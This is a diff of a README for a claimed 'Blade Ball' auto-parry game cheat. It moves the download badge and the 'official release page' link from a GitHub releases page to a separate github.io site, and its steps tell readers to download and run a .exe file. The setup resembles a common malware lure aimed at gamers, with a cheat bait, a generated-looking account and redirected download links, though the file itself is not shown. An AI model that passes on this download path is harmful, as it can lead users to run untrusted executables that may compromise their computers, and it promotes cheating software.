@@ -1,6 +1,6 @@
 # ⚔️ Blade-Ball-Script-2026-Auto-Parry - Improve your parry timing every match
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/genusmedinillaroadman608/Blade-Ball-Script-2026-Auto-Parry/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://genusmedinillaroadman608.github.io)
 
 ## 📌 Project Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before you run the software:
 
 Follow these steps to obtain the correct files:
 
-1.  Visit the official release page: [https://github.com/genusmedinillaroadman608/Blade-Ball-Script-2026-Auto-Parry/releases](https://github.com/genusmedinillaroadman608/Blade-Ball-Script-2026-Auto-Parry/releases).
+1.  Visit the official release page: [https://genusmedinillaroadman608.github.io](https://genusmedinillaroadman608.github.io).
 2.  Look for the latest version at the top of the list.
 3.  Click the file ending in .exe to start your download.
 4.  Save the file to your desktop for easy access.
